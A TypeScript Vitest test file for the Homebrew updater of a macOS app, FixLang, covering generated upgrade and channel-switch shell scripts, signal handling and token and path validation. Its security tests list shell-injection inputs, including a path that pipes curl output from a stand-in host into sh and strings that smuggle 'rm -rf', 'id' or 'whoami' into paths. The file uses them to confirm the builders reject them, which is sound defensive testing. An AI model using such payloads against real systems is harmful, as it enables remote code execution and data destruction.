import { existsSync, mkdirSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { describe, expect, it, vi } from "vitest";
import {
  BETA_CASK_TOKEN,
  BREW_BINARY_CANDIDATES,
  buildChannelSwitchScript,
  buildUpgradeScript,
  caskroomPath,
  caskVersionPath,
  detectActiveCaskChannel,
  downloadsCacheDir,
  isCaskToken,
  matchCachedDownload,
  createHomebrewUpgrader,
  findBrewBinary,
  parseCaskVersion,
  STABLE_CASK_TOKEN,
  type BrewRunner,
  type CaskToken,
} from "./homebrew";
import type * as NodeChildProcess from "node:child_process";

// Frozen ESM bindings cannot be redefined by `vi.spyOn`, so a rogue-subprocess
// guard needs a whole-module mock. `execSync`/`execFileSync` are mocked though
// unused today, so a future direct call throws instead of spawning anything.
const {
  childProcessExecFileMock,
  childProcessSpawnMock,
  childProcessExecSyncMock,
  childProcessExecFileSyncMock,
} = vi.hoisted(() => ({
  childProcessExecFileMock: vi.fn(),
  childProcessSpawnMock: vi.fn(),
  childProcessExecSyncMock: vi.fn(),
  childProcessExecFileSyncMock: vi.fn(),
}));

vi.mock("node:child_process", () => ({
  execFile: childProcessExecFileMock,
  spawn: childProcessSpawnMock,
  execSync: childProcessExecSyncMock,
  execFileSync: childProcessExecFileSyncMock,
}));

// These tests EXECUTE the emitted script under `/bin/sh` against stub
// `brew`/`open`/`pgrep`/`sleep` binaries, because the defect they pin is
// reachability: `... || exit 1` skips the restore and reopen below it while every
// string stays present and correctly ordered in the text. `node:child_process` is
// module-mocked above, so `spawnSync` comes from the real module explicitly.
const { spawnSync: realSpawnSync } =
  await vi.importActual<typeof NodeChildProcess>("node:child_process");

type HelperScriptRun = {
  /** `<verb> <token>` per brew call, plus `open <flag> <target>`, in order. */
  readonly trace: readonly string[];
  readonly status: number;
  readonly stderr: string;
};

/**
 * @param failSteps `<verb>:<token>` fails every time; `<verb>:<token>#<n>` fails
 *   only the nth call.
 */
const runHelperScript = (
  buildScript: (brewBinary: string) => string,
  failSteps: readonly string[] = [],
): HelperScriptRun => {
  const directory = mkdtempSync(path.join(tmpdir(), "fixlang-helper-"));
  const stateDirectory = path.join(directory, "state");
  mkdirSync(stateDirectory);
  const tracePath = path.join(directory, "trace.log");

  const writeStub = (name: string, body: string): string => {
    const file = path.join(directory, name);
    writeFileSync(file, `#!/bin/sh\n${body}\n`, { mode: 0o755 });
    return file;
  };

  const brewStub = writeStub(
    "brew",
    [
      // argv is `<verb> --cask <token>` for every call this module emits.
      'echo "brew $1 $3" >> "$TRACE"',
      'key="$1:$3"',
      "count=0",
      '[ -f "$STATE/$key" ] && count=$(cat "$STATE/$key")',
      "count=$((count + 1))",
      'echo "$count" > "$STATE/$key"',
      "for spec in $FAIL_STEPS; do",
      '  case "$spec" in',
      '    "$key"|"$key#$count") exit 1 ;;',
      "  esac",
      "done",
      "exit 0",
    ].join("\n"),
  );
  // `open`, `pgrep` and `sleep` are absolute paths in the emitted text (never
  // resolved from PATH), so stubbing them means rewriting those literals.
  const script = buildScript(brewStub)
    .replaceAll("/usr/bin/open", writeStub("open", 'echo "open $1 $2" >> "$TRACE"'))
    .replaceAll("/usr/bin/pgrep", writeStub("pgrep", "exit 1"))
    .replaceAll("/bin/sleep", writeStub("sleep", "exit 0"));

  const result = realSpawnSync("/bin/sh", ["-c", script], {
    encoding: "utf8",
    env: {
      ...process.env,
      TRACE: tracePath,
      STATE: stateDirectory,
      FAIL_STEPS: failSteps.join(" "),
    },
  });

  return {
    trace: existsSync(tracePath)
      ? readFileSync(tracePath, "utf8")
          .split("\n")
          .filter((line) => line.length > 0)
      : [],
    status: result.status ?? -1,
    stderr: result.stderr,
  };
};

const APP_PATH = "/Applications/FixLang.app";
const REOPENED = `open -a ${APP_PATH}`;

// The one case `runHelperScript` cannot express: a signal arriving while a brew
// step is in flight. It must outlive the shell, because the defect is that the
// shell dies and the `brew` child does not — hence start/done lines around the
// stub's work and a trace read only after the done line lands.
const runHelperScriptAndSignal = async (
  buildScript: (brewBinary: string) => string,
  signal: NodeJS.Signals,
): Promise<{ readonly trace: readonly string[]; readonly stderr: string }> => {
  const { spawn: realSpawn } = await vi.importActual<typeof NodeChildProcess>(
    "node:child_process",
  );
  const directory = mkdtempSync(path.join(tmpdir(), "fixlang-signal-"));
  const tracePath = path.join(directory, "trace.log");

  const writeStub = (name: string, body: string): string => {
    const file = path.join(directory, name);
    writeFileSync(file, `#!/bin/sh\n${body}\n`, { mode: 0o755 });
    return file;
  };

  const brewStub = writeStub(
    "brew",
    [
      'echo "brew-start $1 $3" >> "$TRACE"',
      // Long enough that a reopen racing it is unmistakable, and deliberately NOT
      // killed by the signal aimed at the shell — that gap is the defect.
      "sleep 2",
      'echo "brew-done $1 $3" >> "$TRACE"',
    ].join("\n"),
  );
  const script = buildScript(brewStub)
    .replaceAll("/usr/bin/open", writeStub("open", 'echo "open $1 $2" >> "$TRACE"'))
    .replaceAll("/usr/bin/pgrep", writeStub("pgrep", "exit 1"))
    .replaceAll("/bin/sleep", writeStub("sleep", "exit 0"));

  const readTrace = (): readonly string[] =>
    existsSync(tracePath)
      ? readFileSync(tracePath, "utf8")
          .split("\n")
          .filter((line) => line.length > 0)
      : [];

  const waitForTraceLine = async (prefix: string): Promise<void> => {
    for (let attempt = 0; attempt < 200; attempt += 1) {
      if (readTrace().some((line) => line.startsWith(prefix))) return;
      await new Promise((resolve) => setTimeout(resolve, 50));
    }
    throw new Error(`Timed out waiting for "${prefix}" in ${readTrace().join(" | ")}`);
  };

  const child = realSpawn("/bin/sh", ["-c", script], {
    env: { ...process.env, TRACE: tracePath },
  });
  let stderr = "";
  child.stderr?.on("data", (chunk: Buffer) => {
    stderr += chunk.toString();
  });
  const exited = new Promise<void>((resolve) => child.on("close", () => resolve()));

  await waitForTraceLine("brew-start");
  child.kill(signal);
  await exited;
  // The shell is gone; the brew child it was waiting on is not.
  await waitForTraceLine("brew-done");

  return { trace: readTrace(), stderr };
};

const caskInfoJson = (version: string, token: string = STABLE_CASK_TOKEN): string =>
  JSON.stringify({ casks: [{ token, version }] });

const upgrader = (
  overrides: Partial<{
    isInstalledApp: boolean;
    caskToken: string;
    files: readonly string[];
    directories: readonly string[];
    cacheEntries: readonly string[];
    fileSizes: Readonly<Record<string, number>>;
    runBrew: BrewRunner;
  }> = {},
) => {
  const startDetached = vi.fn();
  const files = new Set(overrides.files ?? ["/opt/homebrew/bin/brew"]);
  const directories = new Set(
    overrides.directories ?? ["/opt/homebrew/Caskroom/fixlang"],
  );
  const runBrew = vi.fn<BrewRunner>(
    overrides.runBrew ?? (() => Promise.resolve(caskInfoJson("0.2.0"))),
  );

  return {
    startDetached,
    runBrew,
    instance: createHomebrewUpgrader({
      isInstalledApp: overrides.isInstalledApp ?? true,
      logFilePath: "/tmp/userData/logs/homebrew-update.log",
      // Overrides arrive as `string` so a test can pass an unrecognized token;
      // the cast only satisfies the option's narrower type.
      ...(overrides.caskToken === undefined
        ? {}
        : { caskToken: overrides.caskToken as CaskToken }),
      fileExists: (candidate) => files.has(candidate),
      directoryExists: (candidate) => directories.has(candidate),
      cacheDir: "/cache/downloads",
      listDirectory: () => overrides.cacheEntries ?? [],
      fileSize: (candidate) => (overrides.fileSizes ?? {})[candidate] ?? null,
      startDetached,
      runBrew,
    }),
  };
};

describe("Homebrew binary resolution", () => {
  it("never resolves brew from PATH", () => {
    expect([...BREW_BINARY_CANDIDATES]).toEqual([
      "/opt/homebrew/bin/brew",
      "/usr/local/bin/brew",
    ]);
    expect(BREW_BINARY_CANDIDATES.every((candidate) => candidate.startsWith("/"))).toBe(
      true,
    );
  });

  it("prefers the Apple Silicon prefix when both exist", () => {
    expect(findBrewBinary(() => true)).toBe("/opt/homebrew/bin/brew");
  });

  it("falls back to the Intel prefix", () => {
    expect(findBrewBinary((candidate) => candidate === "/usr/local/bin/brew")).toBe(
      "/usr/local/bin/brew",
    );
  });

  it("reports no brew when neither prefix exists", () => {
    expect(findBrewBinary(() => false)).toBeNull();
  });

  it("derives the Caskroom entry from the brew prefix", () => {
    expect(caskroomPath("/opt/homebrew/bin/brew")).toBe(
      "/opt/homebrew/Caskroom/fixlang",
    );
    expect(caskroomPath("/usr/local/bin/brew")).toBe("/usr/local/Caskroom/fixlang");
  });
});

describe("upgrade script", () => {
  const script = buildUpgradeScript("/opt/homebrew/bin/brew");

  it("waits for the app to quit before replacing its bundle", () => {
    expect(script).toContain("/usr/bin/pgrep -x FixLang");
    expect(script.indexOf("pgrep")).toBeLessThan(script.indexOf("upgrade --cask"));
  });

  it("aborts instead of upgrading a still-running app", () => {
    expect(script).toContain('if [ "$waited" -ge 30 ]');
    expect(script).toContain("exit 1");
  });

  it("runs Homebrew non-interactively so it fails instead of hanging", () => {
    expect(script).toContain("export NONINTERACTIVE=1");
  });

  it("upgrades only the fixlang cask and reopens the app", () => {
    expect(script).toContain('"/opt/homebrew/bin/brew" upgrade --cask fixlang');
    expect(script).toContain("/usr/bin/open -b com.fixlang.app");
  });

  it("never automates Gatekeeper or escalates privileges", () => {
    expect(script).not.toMatch(/xattr|sudo|quarantine/);
  });

  // `open -b` resolves a bundle id, and a stray build in a checkout carries the
  // same one, so the replaced path is the only unambiguous target.
  it("reopens the exact bundle Homebrew replaced when the path is known", () => {
    const pinned = buildUpgradeScript(
      "/opt/homebrew/bin/brew",
      "/Applications/FixLang.app",
    );

    expect(pinned).toContain('/usr/bin/open -a "/Applications/FixLang.app"');
    // The id survives only as a fallback, after the path attempt.
    expect(pinned.indexOf("open -a")).toBeLessThan(pinned.indexOf("open -b"));
  });

  // Inert inside double quotes, so the path is KEPT rather than rejected, which
  // would send an odd bundle path down the `open -b` route. Asserted as the whole
  // quoted token: a dropped quote still satisfies a bare substring check.
  it.each([
    "/Applications/Fix Lang.app",
    "/Applications/Fix'Lang.app",
    "/Applications/Fix*Lang.app",
    "/Applications/Fix;Lang.app",
    "/Applications/Fix&&Lang.app",
    "/Applications/Fix|Lang.app",
  ])("quotes rather than rejects a shell-inert path: %s", (appPath) => {
    const quoted = buildUpgradeScript("/opt/homebrew/bin/brew", appPath);

    expect(quoted).toContain(`/usr/bin/open -a "${appPath}"`);
  });

  it.each([
    "relative/FixLang.app",
    '/Applications/FixLang.app"; rm -rf /tmp/x; echo ".app',
    '/Applications/Fix"Lang.app',
    "/Applications/$(whoami).app",
    "/Applications/${HOME}.app",
    "/Applications/`id`.app",
    "/Applications/Fix\\Lang.app",
    "/Applications/Fix\nLang.app",
    "/Applications/Fix\tLang.app",
    "-rf/Applications/FixLang.app",
    "/Applications/FixLang",
  ])("falls back to the bundle id for an unsafe path: %s", (appPath) => {
    const fallback = buildUpgradeScript("/opt/homebrew/bin/brew", appPath);

    expect(fallback).not.toContain('open -a "');
    expect(fallback).toContain("/usr/bin/open -b com.fixlang.app");
  });

  // `upgrade --cask ... || exit 1` aborts after the wait loop confirmed the app
  // is gone. Executed, because the reopen string is in the text either way.
  it("reopens the app even when the upgrade itself fails", () => {
    const { trace, status } = runHelperScript(
      (brew) => buildUpgradeScript(brew, APP_PATH),
      ["upgrade:fixlang"],
    );

    expect(trace).toEqual(["brew upgrade fixlang", REOPENED]);
    expect(status).toBe(1);
  });

  it("reopens the app after a successful upgrade", () => {
    expect(runHelperScript((brew) => buildUpgradeScript(brew, APP_PATH))).toMatchObject({
      trace: ["brew upgrade fixlang", REOPENED],
      status: 0,
    });
  });
});

// An EXIT trap fires when the shell dies from a signal too, and that signal never
// reaches the `brew` child — so the trap reopened FixLang while the orphaned
// Homebrew was still replacing the bundle. Executed rather than indexed, because
// that is a property of `/bin/sh`, not of the string.
//
// LIMIT: under a `sh` that runs no EXIT traps for fatal signals these hold
// trivially rather than failing; the proving mutation must run on macOS.
describe("a signal that kills the helper shell must not reopen the app", () => {
  it.each<NodeJS.Signals>(["SIGTERM", "SIGHUP"])(
    "leaves FixLang closed when %s arrives mid-upgrade",
    async (signal) => {
      const { trace, stderr } = await runHelperScriptAndSignal(
        (brew) => buildUpgradeScript(brew, APP_PATH),
        signal,
      );

      expect(trace.filter((line) => line.startsWith("open"))).toEqual([]);
      expect(trace).toContain("brew-done upgrade fixlang");
      // The log is the only channel left, so this exit has to say so.
      expect(stderr).toContain("leaving FixLang closed");
    },
  );

  // Between the uninstall and the install there is no bundle at the recorded
  // path, so a reopen falls through to the id and starts some other FixLang.
  it("leaves FixLang closed when a signal arrives mid-switch", async () => {
    const { trace } = await runHelperScriptAndSignal(
      (brew) =>
        buildChannelSwitchScript(brew, STABLE_CASK_TOKEN, BETA_CASK_TOKEN, APP_PATH),
      "SIGTERM",
    );

    expect(trace.filter((line) => line.startsWith("open"))).toEqual([]);
  });

  // So "does not reopen on a signal" cannot pass for a script that never reopens.
  it("still reopens exactly once when no signal arrives", () => {
    expect(
      runHelperScript((brew) => buildUpgradeScript(brew, APP_PATH)).trace,
    ).toEqual(["brew upgrade fixlang", REOPENED]);
    expect(
      runHelperScript(
        (brew) =>
          buildChannelSwitchScript(brew, STABLE_CASK_TOKEN, BETA_CASK_TOKEN, APP_PATH),
        ["install:fixlang@beta"],
      ).trace.filter((line) => line.startsWith("open")),
    ).toEqual([REOPENED]);
  });
});

// `quitTimeoutMessage` is the one `HelperScriptParts` field with no boundary
// check, interpolated raw into `echo "..."` where command substitution runs.
// Latent while both call sites pass a literal built from a numeric constant.
describe("every message the helper echoes is inert shell text", () => {
  const messageLines = (script: string): readonly string[] =>
    script.split("\n").filter((line) => line.trimStart().startsWith('echo "'));

  it.each([
    ["upgrade", buildUpgradeScript("/opt/homebrew/bin/brew", APP_PATH)],
    [
      "channel switch",
      buildChannelSwitchScript(
        "/opt/homebrew/bin/brew",
        STABLE_CASK_TOKEN,
        BETA_CASK_TOKEN,
        APP_PATH,
      ),
    ],
  ])("emits no expansion inside an echoed %s message", (_label, script) => {
    const lines = messageLines(script);

    expect(lines.length).toBeGreaterThan(0);
    for (const line of lines) {
      // Everything between the opening and closing quote of `echo "..."`.
      const body = line.slice(line.indexOf('echo "') + 6, line.lastIndexOf('"'));
      expect(body).not.toMatch(/[`$\\]/);
      expect([...body].every((character) => character >= " ")).toBe(true);
    }
  });
});

// The brew path lands in the same `/bin/sh` text as the tokens and bundle path,
// inside a helper already allowed to uninstall an application. Unreachable today;
// the point is that a caller resolving brew from `which` cannot make it reachable.
describe("refuses an unsafe brew path before it reaches the shell text", () => {
  it.each([
    "opt/homebrew/bin/brew",
    "/opt/$(curl -s evil.example/x|sh)/bin/brew",
    "/opt/`id`/bin/brew",
    '/opt/homebrew/bin/brew"; rm -rf /tmp/x; "',
    "/opt/home\\brew/bin/brew",
    "/opt/homebrew/bin/\nbrew",
  ])("refuses %s in both builders", (brewBinary) => {
    expect(() => buildUpgradeScript(brewBinary)).toThrow(/unsafe brew path/);
    expect(() =>
      buildChannelSwitchScript(brewBinary, STABLE_CASK_TOKEN, BETA_CASK_TOKEN),
    ).toThrow(/unsafe brew path/);
  });

  it("still accepts both real Homebrew prefixes", () => {
    for (const candidate of BREW_BINARY_CANDIDATES) {
      expect(() => buildUpgradeScript(candidate)).not.toThrow();
    }
  });
});

describe("cask version parsing", () => {
  it("reads the version the tap currently offers", () => {
    expect(parseCaskVersion(caskInfoJson("0.3.5"))).toBe("0.3.5");
  });

  it("ignores other casks in the same payload", () => {
    expect(
      parseCaskVersion(
        JSON.stringify({
          casks: [
            { token: "something-else", version: "9.9.9" },
            { token: "fixlang", version: "0.3.5" },
          ],
        }),
      ),
    ).toBe("0.3.5");
  });

  it.each([
    "",
    "not json",
    JSON.stringify({ casks: [] }),
    JSON.stringify({ casks: [{ token: "fixlang" }] }),
    JSON.stringify({ casks: [{ token: "fixlang", version: 3 }] }),
    JSON.stringify({ formulae: [] }),
  ])("returns null for unusable brew output", (stdout) => {
    expect(parseCaskVersion(stdout)).toBeNull();
  });

  // The unknown-token test above feeds a payload shaped for the STABLE token, so
  // it returns null with or without the `isCaskToken` guard. Here the payload's
  // own token matches, so without the guard `find` succeeds and returns "9.9.9".
  it("refuses a version even when the payload's own entry matches the unrecognized token", () => {
    expect(
      parseCaskVersion(caskInfoJson("9.9.9", "fixlang-nightly"), "fixlang-nightly"),
    ).toBeNull();
  });
});

describe("download cache lookup", () => {
  it("matches Homebrew's <digest>--<basename> naming without recomputing it", () => {
    expect(
      matchCachedDownload(
        ["unrelated.dmg", "4cc981a4--FixLang-0.4.6-arm64.dmg"],
        "0.4.6",
      ),
    ).toBe("4cc981a4--FixLang-0.4.6-arm64.dmg");
  });

  it("falls back to the in-progress file", () => {
    expect(
      matchCachedDownload(["4cc981a4--FixLang-0.4.6-arm64.dmg.incomplete"], "0.4.6"),
    ).toBe("4cc981a4--FixLang-0.4.6-arm64.dmg.incomplete");
  });

  it.each([[[], "0.4.6"], [["4cc981a4--FixLang-0.4.5-arm64.dmg"], "0.4.6"]] as const)(
    "returns null when nothing matches",
    (entries, version) => {
      expect(matchCachedDownload(entries, version)).toBeNull();
    },
  );

  it.each(["../etc", "a/b", ""])(
    "refuses an unsafe version rather than building a pattern from it: %s",
    (version) => {
      expect(
        matchCachedDownload([`x--FixLang-${version}-arm64.dmg`], version),
      ).toBeNull();
    },
  );

  it("honours HOMEBREW_CACHE and otherwise uses the macOS default", () => {
    expect(downloadsCacheDir({ HOMEBREW_CACHE: "/custom" })).toBe(
      "/custom/downloads",
    );
    expect(downloadsCacheDir({ HOME: "/Users/x" })).toBe(
      "/Users/x/Library/Caches/Homebrew/downloads",
    );
  });
});

describe("Homebrew upgrader", () => {
  it("enables one-click updates for a cask install", () => {
    expect(upgrader().instance.canInstall).toBe(true);
  });

  it("stays disabled for a manual DMG install with no Caskroom entry", () => {
    expect(upgrader({ directories: [] }).instance.canInstall).toBe(false);
  });

  it("stays disabled when Homebrew is not installed", () => {
    expect(upgrader({ files: [] }).instance.canInstall).toBe(false);
  });

  it("stays disabled for an app running outside Applications", () => {
    expect(upgrader({ isInstalledApp: false }).instance.canInstall).toBe(false);
  });

  it("starts the detached helper with the log destination", () => {
    const { instance, startDetached } = upgrader();

    instance.startUpgrade();

    expect(startDetached).toHaveBeenCalledWith(
      buildUpgradeScript("/opt/homebrew/bin/brew"),
      "/tmp/userData/logs/homebrew-update.log",
    );
  });

  it("refreshes the tap before reading the version it can install", async () => {
    const { instance, runBrew } = upgrader();

    await expect(instance.getInstallableVersion()).resolves.toBe("0.2.0");

    expect(runBrew.mock.calls.map(([, args]) => [...args])).toEqual([
      ["update", "--quiet"],
      ["info", "--cask", "fixlang", "--json=v2"],
    ]);
  });

  it("still reports a version when the tap refresh fails", async () => {
    const { instance } = upgrader({
      runBrew: (_binary, args) =>
        args[0] === "update"
          ? Promise.reject(new Error("offline"))
          : Promise.resolve(caskInfoJson("0.2.0")),
    });

    await expect(instance.getInstallableVersion()).resolves.toBe("0.2.0");
  });

  it("reports an unknown version rather than a wrong one when brew fails", async () => {
    const { instance } = upgrader({
      runBrew: () => Promise.reject(new Error("brew exploded")),
    });

    await expect(instance.getInstallableVersion()).resolves.toBeNull();
  });

  it("never asks brew anything for an install it cannot upgrade", async () => {
    const { instance, runBrew } = upgrader({ directories: [] });

    await expect(instance.getInstallableVersion()).resolves.toBeNull();
    expect(runBrew).not.toHaveBeenCalled();
  });

  it("sees a version Homebrew already staged in the Caskroom", () => {
    const { instance } = upgrader({
      directories: [
        "/opt/homebrew/Caskroom/fixlang",
        "/opt/homebrew/Caskroom/fixlang/0.4.0",
      ],
    });

    expect(instance.isVersionInstalled("0.4.0")).toBe(true);
    expect(instance.isVersionInstalled("0.3.7")).toBe(false);
  });

  it.each(["../../../etc", "0.4.0/../..", "", "a/b", "0.4.0 "])(
    "never lets a version string escape the Caskroom: %s",
    (version) => {
      const { instance } = upgrader();

      expect(instance.isVersionInstalled(version)).toBe(false);
      expect(caskVersionPath("/opt/homebrew/bin/brew", version)).toBeNull();
    },
  );

  it("fetches only the cask download, leaving the installed bundle alone", async () => {
    const { instance, runBrew } = upgrader();

    await instance.downloadUpdate();

    expect(runBrew.mock.calls.map(([, args]) => [...args])).toEqual([
      ["fetch", "--cask", "fixlang"],
    ]);
    // A fetch must never be able to replace the running app.
    expect(runBrew.mock.calls.some(([, args]) => args.includes("upgrade"))).toBe(
      false,
    );
  });

  it("gives the download far longer than the metadata probes", async () => {
    const { instance, runBrew } = upgrader();

    await instance.getInstallableVersion();
    await instance.downloadUpdate();

    const [, , fetchTimeout] = runBrew.mock.calls.at(-1) ?? [];
    const probeTimeouts = runBrew.mock.calls
      .slice(0, -1)
      .map(([, , timeout]) => timeout);

    expect(fetchTimeout).toBeGreaterThan(90_000);
    expect(probeTimeouts.every((timeout) => timeout === undefined)).toBe(true);
  });

  it("refuses to download for an install it cannot upgrade", async () => {
    const { instance, runBrew } = upgrader({ directories: [] });

    await expect(instance.downloadUpdate()).rejects.toThrow(
      "FixLang was not installed with the Homebrew cask",
    );
    expect(runBrew).not.toHaveBeenCalled();
  });

  it("reads progress from the partial download as it grows", () => {
    const { instance } = upgrader({
      cacheEntries: ["abc123--FixLang-0.4.6-arm64.dmg.incomplete"],
      fileSizes: {
        "/cache/downloads/abc123--FixLang-0.4.6-arm64.dmg.incomplete": 42,
      },
    });

    expect(instance.getDownloadedBytes("0.4.6")).toBe(42);
  });

  it("prefers the completed download over a stale partial file", () => {
    const { instance } = upgrader({
      cacheEntries: [
        "abc123--FixLang-0.4.6-arm64.dmg.incomplete",
        "abc123--FixLang-0.4.6-arm64.dmg",
      ],
      fileSizes: {
        "/cache/downloads/abc123--FixLang-0.4.6-arm64.dmg.incomplete": 42,
        "/cache/downloads/abc123--FixLang-0.4.6-arm64.dmg": 128,
      },
    });

    expect(instance.getDownloadedBytes("0.4.6")).toBe(128);
  });

  it("reports nothing cached for another version", () => {
    const { instance } = upgrader({
      cacheEntries: ["abc123--FixLang-0.4.5-arm64.dmg"],
      fileSizes: { "/cache/downloads/abc123--FixLang-0.4.5-arm64.dmg": 128 },
    });

    expect(instance.getDownloadedBytes("0.4.6")).toBeNull();
  });

  it("refuses to run anything when the install is not cask-managed", () => {
    const { instance, startDetached } = upgrader({ directories: [] });

    expect(() => instance.startUpgrade()).toThrow(
      "FixLang was not installed with the Homebrew cask",
    );
    expect(startDetached).not.toHaveBeenCalled();
  });
});

describe("cask tokens", () => {
  it("recognizes only the two published tokens", () => {
    expect(isCaskToken(STABLE_CASK_TOKEN)).toBe(true);
    expect(isCaskToken(BETA_CASK_TOKEN)).toBe(true);
    expect(isCaskToken("fixlang-nightly")).toBe(false);
    expect(isCaskToken("")).toBe(false);
  });
});

describe("token-parameterised Caskroom paths", () => {
  it("derives the beta Caskroom entry from an explicit token", () => {
    expect(caskroomPath("/opt/homebrew/bin/brew", BETA_CASK_TOKEN)).toBe(
      "/opt/homebrew/Caskroom/fixlang@beta",
    );
  });

  it("refuses a token that is not one of the two known constants", () => {
    expect(caskroomPath("/opt/homebrew/bin/brew", "fixlang-nightly")).toBeNull();
  });

  it("derives a beta version directory from an explicit token", () => {
    expect(
      caskVersionPath("/opt/homebrew/bin/brew", "0.33.0-beta.1", BETA_CASK_TOKEN),
    ).toBe("/opt/homebrew/Caskroom/fixlang@beta/0.33.0-beta.1");
  });

  it("refuses an unknown token before building a version path", () => {
    expect(
      caskVersionPath("/opt/homebrew/bin/brew", "0.4.0", "fixlang-nightly"),
    ).toBeNull();
  });

  it("reads the beta cask's version from `brew info` output for an explicit token", () => {
    expect(
      parseCaskVersion(caskInfoJson("0.33.0-beta.1", BETA_CASK_TOKEN), BETA_CASK_TOKEN),
    ).toBe("0.33.0-beta.1");
  });

  it("refuses to parse against an unknown token", () => {
    expect(parseCaskVersion(caskInfoJson("0.2.0"), "fixlang-nightly")).toBeNull();
  });

  it("refuses to build an upgrade script for an unknown token", () => {
    expect(() =>
      buildUpgradeScript("/opt/homebrew/bin/brew", null, "fixlang-nightly"),
    ).toThrow();
  });
});

describe("beta channel probing", () => {
  it("probes the beta Caskroom (not the stable one) when configured for the beta channel", () => {
    const { instance } = upgrader({
      caskToken: BETA_CASK_TOKEN,
      directories: ["/opt/homebrew/Caskroom/fixlang@beta"],
    });

    expect(instance.canInstall).toBe(true);
  });

  it("stays disabled for the beta channel when only the stable cask is staged", () => {
    const { instance } = upgrader({
      caskToken: BETA_CASK_TOKEN,
      directories: ["/opt/homebrew/Caskroom/fixlang"],
    });

    expect(instance.canInstall).toBe(false);
  });

  it("passes the beta token, not the stable one, in the `brew info` argv", async () => {
    const { instance, runBrew } = upgrader({
      caskToken: BETA_CASK_TOKEN,
      directories: ["/opt/homebrew/Caskroom/fixlang@beta"],
      runBrew: () => Promise.resolve(caskInfoJson("0.33.0-beta.1", BETA_CASK_TOKEN)),
    });

    await expect(instance.getInstallableVersion()).resolves.toBe("0.33.0-beta.1");

    expect(runBrew.mock.calls.map(([, args]) => [...args])).toEqual([
      ["update", "--quiet"],
      ["info", "--cask", "fixlang@beta", "--json=v2"],
    ]);
  });

  it("passes the beta token in the `brew fetch` argv", async () => {
    const { instance, runBrew } = upgrader({
      caskToken: BETA_CASK_TOKEN,
      directories: ["/opt/homebrew/Caskroom/fixlang@beta"],
    });

    await instance.downloadUpdate();

    expect(runBrew.mock.calls.map(([, args]) => [...args])).toEqual([
      ["fetch", "--cask", "fixlang@beta"],
    ]);
  });

  it("sees a version staged under the beta Caskroom", () => {
    const { instance } = upgrader({
      caskToken: BETA_CASK_TOKEN,
      directories: [
        "/opt/homebrew/Caskroom/fixlang@beta",
        "/opt/homebrew/Caskroom/fixlang@beta/0.33.0-beta.1",
      ],
    });

    expect(instance.isVersionInstalled("0.33.0-beta.1")).toBe(true);
    expect(instance.isVersionInstalled("0.32.0")).toBe(false);
  });

  it("passes the beta token in the upgrade script's argv when starting the upgrade", () => {
    const { instance, startDetached } = upgrader({
      caskToken: BETA_CASK_TOKEN,
      directories: ["/opt/homebrew/Caskroom/fixlang@beta"],
    });

    instance.startUpgrade();

    expect(startDetached).toHaveBeenCalledWith(
      buildUpgradeScript("/opt/homebrew/bin/brew", null, BETA_CASK_TOKEN),
      "/tmp/userData/logs/homebrew-update.log",
    );
  });
});

describe("refuses an unknown cask token before it reaches a path or an argv", () => {
  it("never asks brew anything for an unrecognized token", async () => {
    const { instance, runBrew } = upgrader();

    await expect(
      instance.getInstallableVersion(true, "fixlang-nightly"),
    ).resolves.toBeNull();
    expect(runBrew).not.toHaveBeenCalled();
  });

  it("never checks the filesystem for an unrecognized token", () => {
    const directoryExists = vi.fn(() => true);
    const { instance } = (() => {
      const startDetached = vi.fn();
      const runBrew = vi.fn<BrewRunner>(() => Promise.resolve(caskInfoJson("0.2.0")));
      return {
        instance: createHomebrewUpgrader({
          isInstalledApp: true,
          logFilePath: "/tmp/userData/logs/homebrew-update.log",
          fileExists: () => true,
          directoryExists,
          startDetached,
          runBrew,
        }),
      };
    })();
    directoryExists.mockClear();

    expect(instance.isVersionInstalled("0.4.0", "fixlang-nightly")).toBe(false);
    expect(directoryExists).not.toHaveBeenCalled();
  });

  it("never runs `brew fetch` for an unrecognized token", async () => {
    const { instance, runBrew } = upgrader();

    await expect(instance.downloadUpdate("fixlang-nightly")).rejects.toThrow();
    expect(runBrew).not.toHaveBeenCalled();
  });

  it("never inspects the download cache for an unrecognized token", () => {
    const { instance } = upgrader({
      cacheEntries: ["abc123--FixLang-0.4.6-arm64.dmg"],
      fileSizes: { "/cache/downloads/abc123--FixLang-0.4.6-arm64.dmg": 128 },
    });

    expect(instance.getDownloadedBytes("0.4.6", "fixlang-nightly")).toBeNull();
  });

  it("never starts the detached helper for an unrecognized token", () => {
    const { instance, startDetached } = upgrader();

    expect(() => instance.startUpgrade(null, "fixlang-nightly")).toThrow();
    expect(startDetached).not.toHaveBeenCalled();
  });
});

describe("active channel detection", () => {
  it("reports stable when only the stable Caskroom entry exists", () => {
    const directoryExists = (candidate: string): boolean =>
      candidate === "/opt/homebrew/Caskroom/fixlang";

    expect(detectActiveCaskChannel("/opt/homebrew/bin/brew", directoryExists)).toBe(
      "stable",
    );
  });

  it("reports beta when only the beta Caskroom entry exists", () => {
    const directoryExists = (candidate: string): boolean =>
      candidate === "/opt/homebrew/Caskroom/fixlang@beta";

    expect(detectActiveCaskChannel("/opt/homebrew/bin/brew", directoryExists)).toBe(
      "beta",
    );
  });

  it("reports both when stable and beta are both staged", () => {
    expect(detectActiveCaskChannel("/opt/homebrew/bin/brew", () => true)).toBe("both");
  });

  it("reports neither as null", () => {
    expect(detectActiveCaskChannel("/opt/homebrew/bin/brew", () => false)).toBeNull();
  });

  it("never spawns a subprocess — only the two directory probes decide the answer", () => {
    const directoryExists = vi.fn(() => false);

    detectActiveCaskChannel("/opt/homebrew/bin/brew", directoryExists);

    expect(directoryExists).toHaveBeenCalledTimes(2);
    expect(directoryExists).toHaveBeenCalledWith("/opt/homebrew/Caskroom/fixlang");
    expect(directoryExists).toHaveBeenCalledWith(
      "/opt/homebrew/Caskroom/fixlang@beta",
    );
  });

  // The previous test only counts calls to the injected probe. These spies wrap
  // the REAL module `homebrew.ts` imports from, so a call bypassing it is caught.
  it("never shells out — no child_process call of any kind decides the answer", () => {
    childProcessExecFileMock.mockClear();
    childProcessSpawnMock.mockClear();
    childProcessExecSyncMock.mockClear();
    childProcessExecFileSyncMock.mockClear();

    detectActiveCaskChannel("/opt/homebrew/bin/brew", () => true);

    expect(childProcessExecFileMock).not.toHaveBeenCalled();
    expect(childProcessSpawnMock).not.toHaveBeenCalled();
    expect(childProcessExecSyncMock).not.toHaveBeenCalled();
    expect(childProcessExecFileSyncMock).not.toHaveBeenCalled();
  });
});


describe("channel switch script", () => {
  const escapeRegExp = (value: string): string =>
